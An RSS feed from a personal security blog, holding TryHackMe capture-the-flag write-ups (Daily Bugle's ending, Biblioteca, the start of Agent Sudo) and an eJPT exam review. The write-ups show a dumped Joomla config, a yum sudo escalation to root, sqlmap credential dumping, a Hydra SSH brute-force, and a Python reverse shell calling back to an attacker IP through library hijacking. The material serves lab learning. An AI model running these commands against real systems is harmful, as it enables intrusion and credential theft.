+<p>Looking around, we first inspect the server&rsquo;s home directories. There&rsquo;s actually only one this time, belonging to <code>j------n</code>. Unfortunately we don&rsquo;t have any easy way of accessing the contents (yet).</p>
+<p>Next, we check out the server&rsquo;s web server directory (<code>/var/html/www</code>) as the <code>apache</code> user.</p>
+<pre tabindex="0"><code>sh-4.2$ cd /var/www/html 
+cd /var/www/html
+sh-4.2$ ls
+ls
+LICENSE.txt
+README.txt
+administrator
+bin
+cache
+cli
+components
+configuration.php
+htaccess.txt
+images
+includes
+index.php
+language
+layouts
+libraries
+media
+modules
+plugins
+robots.txt
+templates
+tmp
+web.config.txt
+
+Here we are lucky enough to stumble upon `configuration.php`.
+
+sh-4.2$ cat configuration.php
+cat configuration.php
+&lt;?php
+class JConfig {
+	public $offline = &#39;0&#39;;
+	public $offline_message = &#39;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#39;;
+	public $display_offline_message = &#39;1&#39;;
+	public $offline_image = &#39;&#39;;
+	public $sitename = &#39;The Daily Bugle&#39;;
+	public $editor = &#39;tinymce&#39;;
+	public $captcha = &#39;0&#39;;
+	public $list_limit = &#39;20&#39;;
+	public $access = &#39;1&#39;;
+	public $debug = &#39;0&#39;;
+	public $debug_lang = &#39;0&#39;;
+	public $dbtype = &#39;mysqli&#39;;
+	public $host = &#39;localhost&#39;;
+	public $user = 👍&#39;root&#39;;👍
+	public $password = 👍&#39;n----------u&#39;;👍
+	public $db = &#39;joomla&#39;;
+	public $dbprefix = &#39;fb9j5_&#39;;
+	public $live_site = &#39;&#39;;
+	public $secret = &#39;UAMBRWzHO3oFPmVC&#39;;
+	public $gzip = &#39;0&#39;;
+	public $error_reporting = &#39;default&#39;;
+	public $helpurl = &#39;https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}&#39;;
+	public $ftp_host = &#39;127.0.0.1&#39;;
+	public $ftp_port = &#39;21&#39;;
+	public $ftp_user = &#39;&#39;;
+	public $ftp_pass = &#39;&#39;;
+	public $ftp_root = &#39;&#39;;
+	public $ftp_enable = &#39;0&#39;;
+	public $offset = &#39;UTC&#39;;
+	public $mailonline = &#39;1&#39;;
+	public $mailer = &#39;mail&#39;;
+	public $mailfrom = &#39;j---h@tryhackme.com&#39;;
+	public $fromname = &#39;The Daily Bugle&#39;;
+	public $sendmail = &#39;/usr/sbin/sendmail&#39;;
+	public $smtpauth = &#39;0&#39;;
+	public $smtpuser = &#39;&#39;;
+	public $smtppass = &#39;&#39;;
+	public $smtphost = &#39;localhost&#39;;
+	public $smtpsecure = &#39;none&#39;;
+	public $smtpport = &#39;25&#39;;
+	public $caching = &#39;0&#39;;
+	public $cache_handler = &#39;file&#39;;
+	public $cachetime = &#39;15&#39;;
+	public $cache_platformprefix = &#39;0&#39;;
+	public $MetaDesc = &#39;New York City tabloid newspaper&#39;;
+	public $MetaKeys = &#39;&#39;;
+	public $MetaTitle = &#39;1&#39;;
+	public $MetaAuthor = &#39;1&#39;;
+	public $MetaVersion = &#39;0&#39;;
+	public $robots = &#39;&#39;;
+	public $sef = &#39;1&#39;;
+	public $sef_rewrite = &#39;0&#39;;
+	public $sef_suffix = &#39;0&#39;;
+	public $unicodeslugs = &#39;0&#39;;
+	public $feed_limit = &#39;10&#39;;
+	public $feed_email = &#39;none&#39;;
+	public $log_path = &#39;/var/www/html/administrator/logs&#39;;
+	public $tmp_path = &#39;/var/www/html/tmp&#39;;
+	public $lifetime = &#39;15&#39;;
+	public $session_handler = &#39;database&#39;;
+	public $shared_session = &#39;0&#39;;
+}sh-4.2$ 
+</code></pre><p>Luckily for us, in addition to giving us access to the MariaDB database that powers the Joomla instance, this password also allows to log in via <code>ssh</code> as <code>j------n</code>!</p>
+<h2 id="privilege-escalation-1">Privilege escalation</h2>
+<p>As a good standard practice, we run <code>sudo -l</code> upon gaining user access. In this case, that really pays off:</p>
+<pre tabindex="0"><code>[j------n@dailybugle ~]$ sudo -l
+Matching Defaults entries for j------n on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&#34;COLORS DISPLAY
+    HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;, env_keep+=&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;,
+    env_keep+=&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;, env_keep+=&#34;LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE&#34;, env_keep+=&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;,
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User j------n may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+[j------n@dailybugle ~]$ 
+</code></pre><p>Even better, there&rsquo;s an entry for <code>yum</code> on <a href="%60https://gtfobins.github.io/gtfobins/yum/#sudo%60">GTFOBins</a>. Let&rsquo;s escalate our privileges!</p>
+<pre tabindex="0"><code>[j------n@dailybugle ~]$ TF=$(mktemp -d)
+[j------n@dailybugle ~]$ cat &gt;$TF/x&lt;&lt;EOF
+&gt; [main]
+&gt; plugins=1
+&gt; pluginpath=$TF
+&gt; pluginconfpath=$TF
+&gt; EOF
+[j------n@dailybugle ~]$ 
+[j------n@dailybugle ~]$ cat &gt;$TF/y.conf&lt;&lt;EOF
+&gt; [main]
+&gt; enabled=1
+&gt; EOF
+[j------n@dailybugle ~]$ 
+[j------n@dailybugle ~]$ cat &gt;$TF/y.py&lt;&lt;EOF
+&gt; import os
+&gt; import yum
+&gt; from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+&gt; requires_api_version=&#39;2.1&#39;
+&gt; def init_hook(conduit):
+&gt;   os.execl(&#39;/bin/sh&#39;,&#39;/bin/sh&#39;)
+&gt; EOF
+[j------n@dailybugle ~]$ 
+[j------n@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# whoami
+root
+</code></pre><h2 id="lessons-learned">Lessons learned</h2>
+<ul>
+<li>This was (yet another) great lesson in not underestimating the frequency with which people re-use passwords!</li>
+<li>Equally, fully exploring/enumerating the web directories of a server running a web application should always be a priority!</li>
+<li>With great power must also come great responsibility.</li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>THM: Biblioteca -- Write-Up</title>
+            <link>https://robscharf.github.io/posts/2022/07/thm-biblioteca--write-up/</link>
+            <pubDate>Fri, 08 Jul 2022 13:04:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2022/07/thm-biblioteca--write-up/</guid>
+            <description>About Biblioteca is a medium rated CTF room on TryHackMe. Rooting this box involves carrying out a successful SQL injection to obtain a foothold, identifying an opportunity for a &amp;ldquo;lateral privilege escalation&amp;rdquo; via brute-force attack, and further escalation to root via Python library hijacking.
+Note: I have replaced all instances of the virtual machine&amp;rsquo;s ip address with &amp;lt;target-ip&amp;gt; throughout this write-up.
+Enumeration nmap I began by running a standard nmap scan against the target host.</description>
+            <content type="html"><![CDATA[<h2 id="about">About</h2>
+<p>Biblioteca is a <em>medium</em> rated CTF room on <a href="www.tryhackme.com">TryHackMe</a>. Rooting this box involves carrying out a successful SQL injection to obtain a foothold, identifying an opportunity for a &ldquo;lateral privilege escalation&rdquo; via brute-force attack, and further escalation to <code>root</code> via Python library hijacking.</p>
+<p><strong>Note:</strong> I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<p>I began by running a standard nmap scan against the target host.</p>
+<p><code>nmap -sCV -oN nmap.out &lt;target-ip&gt;</code></p>
+<pre tabindex="0"><code>Nmap scan report for &lt;target-ip&gt;
+Host is up (0.099s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 00:0b:f9:bf:1d:49:a6:c3:fa:9c:5e:08:d1:6d:82:02 (RSA)
+|   256 a1:0c:8e:5d:f0:7f:a5:32:b2:eb:2f:7a:bf:ed:bf:3d (ECDSA)
+|_  256 9e:ef:c9:0a:fc:e9:9e:ed:e3:2d:b1:30:b6:5f:d4:0b (ED25519)
+
+8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-title:  Login 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Our scan identified two active/open ports, <code>22</code>, which hosts a standard OpenSSH service and <code>8000</code>, which houses a Werkzeug python. While Werkzeug is <em>primarily</em> a Python library, it has the ablity to function as a development http server for testing purposes. This is often the CTF context that it appears in.</p>
+<h3 id="manual-enumeration">Manual enumeration</h3>
+<p>Visiting the Werkzeug port via a web browser immediately redirects us to <code>http://&lt;target-ip&gt;:8000/login</code>.</p>
+<p><img src="/images/biblioteca/login.png" alt="biblioteca-login"></p>
+<p>This seems to be a standard login page/form. We can register a standard account with no problem, but that doesn&rsquo;t get us anything other than a polite welcome message.</p>
+<h2 id="sql-injection">SQL Injection</h2>
+<p>As we were able to register a new set of credentials, we can assume that the data is being stored somewhere. Thus, we can probe the form with SQLMap to identify whether or not it is vulnerable to an SQL injection attack.</p>
+<h3 id="sqlmap">SQLMap</h3>
+<p><code>sqlmap -u http://&lt;target-ip&gt;:8000/login --data 'username='test'&amp;password='test'' --dbs --dump</code></p>
+<pre tabindex="0"><code>[13:05:47] [INFO] testing connection to the target URL
+[13:05:48] [INFO] testing if the target URL content is stable
+[13:05:48] [INFO] target URL content is stable
+[13:05:48] [INFO] testing if POST parameter &#39;username&#39; is dynamic
+
+✂️ ................................ ✂️
+
+[13:06:26] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.0.12
+[13:06:26] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] website
+
+[13:06:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[13:06:27] [INFO] fetching current database
+[13:06:27] [INFO] fetching tables for database: &#39;website&#39;
+[13:06:27] [INFO] fetching columns for table &#39;users&#39; in database &#39;website&#39;
+[13:06:27] [INFO] fetching entries for table &#39;users&#39; in database &#39;website&#39;
+Database: website
+Table: users
+[1 entry]
++----+-------------------+----------------+----------+
+| id | email             | password       | username |
++----+-------------------+----------------+----------+
+| 1  | s-----@email.boop | M------------ | s-----   |
++----+-------------------+----------------+----------+
+</code></pre><h2 id="foothold">Foothold</h2>
+<p>Now that we have user credentials, we can use them to log-in to the server via SSH. From there, we do more manual enumeration to identify a privilege escalation vector.</p>
+<h3 id="more-enumeration">More Enumeration</h3>
+<pre tabindex="0"><code>s-----@biblioteca:~$ pwd
+/home/s-----
+</code></pre><pre tabindex="0"><code>s-----@biblioteca:~$ cat /etc/passwd
+root❌0:0:root:/root:/bin/bash
+daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+✂️ ................................ ✂️
+s-----❌1000:1000:s-----:/home/s-----:/bin/bash
+lxd❌998💯:/var/snap/lxd/common/lxd:/bin/false
+mysql❌113:117:MySQL Server,,,:/nonexistent:/bin/false
+h----❌1001:1001::/home/h----:/bin/bash
+</code></pre><p>Great! From the <code>/etc/passwd</code> file, we can see that there is also user <code>h----</code>. Let&rsquo;s check their home directory.</p>
+<pre tabindex="0"><code>s-----@biblioteca:/home/h----$ ls -lsa
+total 32
+4 drwxr-xr-x 3 root  root  4096 Mar  2 03:01 .
+4 drwxr-xr-x 4 root  root  4096 Dec  7 02:42 ..
+0 lrwxrwxrwx 1 root  root     9 Dec  7 03:24 .bash_history -&gt; /dev/null
+4 -rw-r--r-- 1 h---- h----  220 Feb 25  2020 .bash_logout
+4 -rw-r--r-- 1 h---- h---- 3771 Feb 25  2020 .bashrc
+4 drwx------ 2 h---- h---- 4096 Dec  7 02:54 .cache
+4 -rw-r----- 1 root  h----  497 Dec  7 02:53 hasher.py
+4 -rw-r--r-- 1 h---- h----  807 Feb 25  2020 .profile
+4 -rw-r----- 1 root  h----   45 Mar  2 03:01 user.txt
+0 -rw------- 1 h---- h----    0 Dec  7 03:23 .viminfo
+</code></pre><p>In addition to the user flag, we see that there is a script named <code>hasher.py</code> in the <code>h----</code> home directory. Moreover, this file is owned by root!</p>
+<pre tabindex="0"><code>s-----@biblioteca:/home/h----$ sudo -l
+[sudo] password for s-----: 
+Sorry, user s----- may not run sudo on biblioteca.
+</code></pre><h2 id="exploitation---ssh">Exploitation - SSH</h2>
+<p>While we can&rsquo;t interact with it as <code>s-----</code>, it&rsquo;s likely that we will be able to as the user <code>h----</code>. Let&rsquo;s try to brute force that account&rsquo;s SSH credentials with Hydra.</p>
+<p><code>hydra -t 4 -l h---- -P /usr/share/wordlists/rockyou.txt -vV &lt;target-ip&gt; ssh</code></p>
+<pre tabindex="0"><code>[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;123456&#34; - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;12345&#34; - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;123456789&#34; - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;password&#34; - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;iloveyou&#34; - 5 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;princess&#34; - 6 of 14344399 [child 1] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;1234567&#34; - 7 of 14344399 [child 2] (0/0)
+✂️ ................................ ✂️
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;yomama&#34; - 2056 of 14344399 [child 3] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;spooky&#34; - 2057 of 14344399 [child 1] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;pimpin1&#34; - 2058 of 14344399 [child 3] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;maricel&#34; - 2059 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;gizmo1&#34; - 2060 of 14344399 [child 3] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;dondon&#34; - 2061 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;divine&#34; - 2062 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;chucky&#34; - 2063 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;aries&#34; - 2064 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;rowena&#34; - 2065 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;nokia&#34; - 2066 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;stitch&#34; - 2067 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;jerry&#34; - 2068 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;h----&#34; - 2069 of 14344399 [child 2] (0/0)
+[22][ssh] host: &lt;target-ip&gt;   login: h----   password: h----
+[STATUS] attack finished for &lt;target-ip&gt; (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+</code></pre><p>We can now connect as user <code>h----</code> via SSH and access <code>hasher.py</code> (as well as the user flag)!</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo--l"><code>sudo -l</code></h3>
+<p><strong>As a refresher:</strong> The <code>sudo</code> command represents one of the most straightforward Linux privilege escalation vectors. By default, the command allows you to run a program with root privileges. Beyond this, system administrators may provision standard user accounts <code>sudo</code> privileges related to the execution of context-specific program execution.</p>
+<p>To check which, if any, <code>sudo</code> privileges that a user has, we can run <code>sudo</code> with the <code>-l</code> flag to list commands that the current user is allowed (and/or prohibited) from executing with elevated permissions. The <code>-U</code> flag can be used to specify another valid user on the current host machine.</p>
+<pre tabindex="0"><code>h----@biblioteca:~$ sudo -l
+Matching Defaults entries for h---- on biblioteca:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User h---- may run the following commands on biblioteca:
+    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/h----/hasher.py
+</code></pre><p>Here we see <code>SETENV</code>, which means we can set the environment variables while running the listed script as root! In this context, we see that <code>hasher.py</code> imports <code>hashlib.py</code>.</p>
+<p>Thus, we have the ability to create a fraudulent <code>hashlib.py</code> file containing reverse shell code that the user <code>h----</code> can execute as <code>root</code> via <code>hasher.py</code>.</p>
+<p>First, we find <code>hashlib.py</code>:</p>
+<pre tabindex="0"><code>h----@biblioteca:~$ find / -name hashlib.py 2&gt;/dev/null
+/snap/core20/1361/usr/lib/python3.8/hashlib.py
+/snap/core20/1270/usr/lib/python3.8/hashlib.py
+/snap/core18/2284/usr/lib/python3.6/hashlib.py
+/snap/core18/2253/usr/lib/python3.6/hashlib.py
+/usr/lib/python3/dist-packages/landscape/lib/hashlib.py
+/usr/lib/python3/dist-packages/nacl/hashlib.py
+/usr/lib/python3.8/hashlib.py
+</code></pre><p>We then copy the script to  the <code>/tmp</code> directory:</p>
+<pre tabindex="0"><code>h----@biblioteca:/usr/lib/python3.8$ cp hashlib.py /tmp
+h----@biblioteca:/usr/lib/python3.8$ cd /tmp
+</code></pre><p>Next, we edit our &ldquo;new&rdquo; <code>hashlib.py</code> script to contain a basic python reverse shell:</p>
+<pre tabindex="0"><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;attack-ip&gt;&#34;,&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)
+</code></pre><p>Finally, we take advantage of our <code>SETENV</code> privileges to run the script with an added <code>PYTHONPATH</code> argument. <code>PYTHONPATH</code> is an environmental variable that adds an additional directory (or directories) that Python checks for modules and packages at runtime. Conventionally, this is used to include custom Python libraries that are otherwise inappropriate to place in the default global location.</p>
+<pre tabindex="0"><code>h----@biblioteca:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/h----/hasher.py
+</code></pre><pre tabindex="0"><code>╭─[kali-bot] as virtualtack in ~
+╰──➤ nc -lvnp &lt;port&gt;                        
+listening on [any] &lt;port&gt; ...
+connect to [&lt;my=ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 35176
+# whoami
+whoami
+root
+# ls /root 
+ls /root
+root.txt  snap
+# cat /root/root.txt
+cat /root/root.txt
+THM{P-----------------------}
+</code></pre><h2 id="lessons-learned">Lessons learned</h2>
+<ul>
+<li>I often forget to stabilize my python-enabled shells as a reflexive best practice. This can be done, for example, with <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></li>
+<li>This room introduced me to Python library hijacking. More can be read about this topic on:
+<ul>
+<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/">Raj Chandel&rsquo;s Hacking Articles</a></li>
+<li><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">rastating.github.io</a></li>
+</ul>
+</li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>I passed the eJPT!</title>
+            <link>https://robscharf.github.io/posts/2022/06/i-passed-the-ejpt/</link>
+            <pubDate>Mon, 20 Jun 2022 11:14:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2022/06/i-passed-the-ejpt/</guid>
+            <description>I am pleased to share that I recently passed the eLearnSecurity Junior Penetration Tester certification exam on June 16!
+The Exam According to INE&amp;rsquo;s website:
+The eJPT is a three day, 20 question exam, that focuses on challenging you to prove your skillset in penetration testing foundations including programming, networking vulnerabilities, web attack vectors, and a host of other entry level skills&amp;hellip; Covering a host of skills which include entry level web penetration techniques, the eJPT provides you with the confidence and knowledge to begin training for more advanced penetration techniques and specialities.</description>
+            <content type="html"><![CDATA[<p>I am pleased to share that I recently passed the <a href="https://elearnsecurity.com/product/ejpt-certification/">eLearnSecurity Junior Penetration Tester</a> certification exam on June 16!</p>
+<br/>
+<center>
+<img src="/images/ejpt-cert.png" style="height:420px"> 
+</center>
+<h2 id="the-exam">The Exam</h2>
+<p>According to <a href="https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester">INE&rsquo;s website</a>:</p>
+<blockquote>
+<p>The eJPT is a three day, 20 question exam, that focuses on challenging you to prove your skillset in penetration testing foundations including programming, networking vulnerabilities, web attack vectors, and a host of other entry level skills&hellip; Covering a host of skills which include entry level web penetration techniques, the eJPT provides you with the confidence and knowledge to begin training for more advanced penetration techniques and specialities.</p>
+</blockquote>
+<h2 id="my-experience">My Experience</h2>
+<p>There are thousands of reviews and suggested study guides for the eJPT on the internet. Thus, I will not try to reinvent any wheels with this post.</p>
+<h3 id="preparation">Preparation</h3>
+<p>Before taking the exam, I spent about 3 weeks with INE&rsquo;s Penetration Testing Student learning path (read: online course).</p>
+<p>From my perspective and level of experience, the course material largely fell into four buckets:</p>
+<ol>
+<li>Introductory materials for elementary penetration testing tasks and concepts, such as computer networking, HTTP protocol basics, scripting with common languages like C++, Python, and Bash, as well as the use of basic tools like Burp Suite, Nmap, John the Ripper, and the Metasploit framework</li>
+<li>The use of other, broadly outdated, tools<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></li>
+<li>Review of concepts and techniques I have previously learned (or been introduced to) via TryHackMe<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> and/or miscellanious YouTube videos, blog posts, etc.</li>
+<li>Networking</li>
+</ol>
+<p>I emphasize #4 here, as, previous to my eJPT preparations, I had only engaged with network routing and live host discovery in theoretical/conceptual terms. I have not yet made my way through any of the TryHackMe network-based rooms, such as <a href="https://tryhackme.com/room/wreath">Wreath</a> or <a href="https://tryhackme.com/network/throwback">Throwback</a>.</p>
+<p>Unfortunately, I wasn&rsquo;t able to access the preparatory &ldquo;eJPT Exam Preparation&rdquo; module (1 of 4 in the course), which, ostensibly, contains opportunities to practice network enumeration. According to this <a href="https://ine.com/blog/message-from-ine-ceo">Message from the INE CEO</a>, the company has encountered significant unforseen issues with migrating eLS&rsquo; previously VPN-based labs to the browser-based INE teaching platform. While I don&rsquo;t think this is particularly egregious in and of itself, the timing was certainly unfortunate for me.</p>
+<p>Indeed, I was only able to practice my network discovery and routing through the &ldquo;Black-box Penetration Test 1&rdquo; box at the end of the Penetration Testing Basics module. &ldquo;Black-box Penetration Test&rdquo; boxes 2 and 3, unfortunately, do not involve &ldquo;secret&rdquo; servers, but pre-identified and directly accessible hosts.</p>
+<h3 id="handy-resources">Handy Resources</h3>
+<p>In addition to a smattering of reddit posts and similar incidental resources, I found the following guiding materials to be helpful in preparing for my exam:</p>
+<ul>
+<li><a href="https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/">KentoSec - How to Pass the eJPT</a></li>
+<li><a href="https://github.com/fdicarlo/eJPT">fdicarlo - eJPT</a></li>
+<li><a href="https://jarrodrizor.com/ejpt-guide/">Jarrod Rizor&rsquo;s eJPT Guide</a></li>
+<li><a href="https://github.com/grumpzsux/eJPT-Notes">grumpzsux&rsquo;s eJPT Notes 2022</a></li>
+<li><a href="https://github.com/tejasanerao/eJPT-Cheatsheet">tejasanerao&rsquo;s eJPT-Cheatsheet</a></li>
+</ul>
+<p><strong>Note:</strong> There is an enormous amount of overlap between each of these resources! Please don&rsquo;t feel like it is necessary to engage with all of them.</p>
+<h3 id="exam-impressions">Exam Impressions</h3>
+<p>All-in-all, I felt that the INE/eLS course and certification exam was an enjoyable and rewarding process. The exam, particularly, was fun and excellent preliminary preparation for future black-box exam scenarios, from both a methodological and emotional point of view.</p>
+<p>With only approximately 3 months of experience in infosec, offensive security, and cybersecurity more broadly, I was able to complete the exam in approximately 9 hours. After approximately 6 hours, I had secured enough points to pass the exam, though I wanted to take the opportunity to use the extensive (compared to what I am used to!) exam network and complete the remaining tasks that involved my weaker subject-areas, such as Windows host exploitation.</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>This distinction is made with the knowledge that eLS/INE are <a href="https://ine.com/blog/new-ejpt-coming-soon?utm%5C_source=linkedin&amp;utm%5C_medium=organic&amp;utm%5C_campaign=NeweJPTComingSoon&amp;utm%5C_content=blog">currently working on rolling out the eJPTv2</a>. The INE course for the new exam, <a href="https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2">Penetration Testing Student v2</a>, appears to have a significantly updated curriculum.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p>Relative to other platforms/courses, I have completed a relatively high number of THM rooms over the past two months. At the time of writing, I have completed 106 Rooms and have rank 11134. You can follow along with my progress by clicking <a href="https://tryhackme.com/p/robscharf">here</a>.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+]]></content>
+        </item>
+        
+        <item>
+            <title>THM: Agent Sudo -- Write-Up</title>
+            <link>https://robscharf.github.io/posts/2022/05/thm-agent-sudo--write-up/</link>
+            <pubDate>Mon, 23 May 2022 14:14:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2022/05/thm-agent-sudo--write-up/</guid>
+            <description>About TryHackMe.com&amp;rsquo;s Agent Sudo is a beginner-friendly capture-the-flag virtual machine by DesKel. Agent Sudo has a secret agent theme and challenges users to capture two flags and gain root access by locating and decrypting a series of confidential communications.
+Note I have replaced all instances of the virtual machine&amp;rsquo;s ip address with &amp;lt;target-ip&amp;gt; throughout this write-up.
+Methodology We begin our enumeration efforts by running an nmap scan on the target machine to understand the ports that are open to network traffic.</description>
+            <content type="html"><![CDATA[<h2 id="about">About</h2>
+<p><a href="https://tryhackme.com/">TryHackMe.com</a>&rsquo;s <a href="https://tryhackme.com/room/agentsudoctf">Agent Sudo</a> is a beginner-friendly capture-the-flag virtual machine by <a href="https://tryhackme.com/p/DesKel">DesKel</a>. Agent Sudo has a secret agent theme and challenges users to capture two flags and gain root access by locating and decrypting a series of confidential communications.</p>
+<h3 id="note">Note</h3>
+<p>I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
+<h2 id="methodology">Methodology</h2>
+<p>We begin our enumeration efforts by running an <code>nmap</code> scan on the target machine to understand the ports that are open to network traffic. I start with the <code>-V</code>, <code>-C</code>, and <code>-T4</code> flags.</p>
+<pre tabindex="0"><code># Nmap 7.92 scan initiated Mon May 23 09:23:53 2022 as: nmap -sVC -T4 -o initial-svc-nmap.out 10.10.166.253
+Nmap scan report for 10.10.166.253
+Host is up (0.13s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Annoucement
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon May 23 09:24:05 2022 -- 1 IP address (1 host up) scanned in 12.65 seconds
+</code></pre><p>Now we know that the target is running <code>vsftpd 3.0.3</code> on <code>port 21</code>, <code>OpenSSH 7.6p1</code> on <code>port 22</code>, and an <code>Apache httpd 2.4.29</code> web server on <code>port 80</code> with the <code>http-title</code> of <code>announcement</code> - all open to <code>tcp</code> traffic.</p>
+<p>Next, we visit the web server in a web browser.</p>
+<p><code>/index.html</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DocType html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
